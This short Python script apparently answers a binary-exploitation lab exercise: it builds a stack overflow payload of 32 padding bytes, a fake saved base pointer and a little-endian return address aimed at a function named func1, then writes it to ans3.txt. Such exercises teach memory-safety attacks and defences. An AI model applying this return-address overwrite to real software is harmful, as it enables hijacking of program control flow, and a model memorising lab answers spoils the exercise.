padding = b"A" * 32
func1_address = b"\x2b\x12\x40\x00\x00\x00\x00\x00"  # 小端地址
fake_rbp = b'\x00\x36\x40\x00\x00\x00\x00\x00'
payload = padding + fake_rbp + func1_address
# Write the payload to a file
with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans3.txt")